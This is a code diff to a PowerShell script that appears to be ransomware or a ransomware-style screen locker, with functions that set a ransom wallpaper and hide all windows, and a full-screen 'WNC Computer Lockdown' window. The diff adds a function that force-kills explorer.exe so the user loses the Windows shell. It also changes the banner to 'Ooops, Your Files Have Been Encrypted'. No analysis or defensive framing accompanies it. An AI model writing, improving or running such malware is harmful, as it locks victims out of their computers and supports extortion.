@@ -382,6 +382,12 @@ function Set-RansomWallpaper {
     $bitmap.Dispose()
 }
 
+
+function Kill-Explorer {
+    try {
+        Get-Process -Name "explorer" -ErrorAction SilentlyContinue | Stop-Process -Force
+    } catch {}
+}
 # ========== EXECUTION FLOW ==========
 
 # Step 1: Hide all windows
@@ -390,12 +396,13 @@ Hide-AllWindows
 # Step 2: Change background wallpaper
 Set-RansomWallpaper
 
-# Step 3: Wait 1 second
-Start-Sleep -Seconds 1
+
 
 # Step 4: Continue with the rest of the script (getting files and showing UI)
 # Get files for display
 $systemFiles = Get-SystemFiles
+
+Kill-Explorer
 
 $w = New-Object System.Windows.Window
 $w.Title = "WNC Computer Lockdown - 你完蛋了"
@@ -418,7 +425,7 @@ $g.ColumnDefinitions.Add($col1)
 $g.ColumnDefinitions.Add($col2)
 
 $title = New-Object System.Windows.Controls.TextBlock
-$title.Text = "⚠️ CRITICAL SYSTEM ALERT - YOUR FILES ARE ENCRYPTED"
+$title.Text = "⚠️ Ooops, Your Files Have Been Encrypted"
 $title.Foreground = [System.Windows.Media.Brushes]::White
 $title.FontFamily = 'Segoe UI'
 $title.FontSize = 28
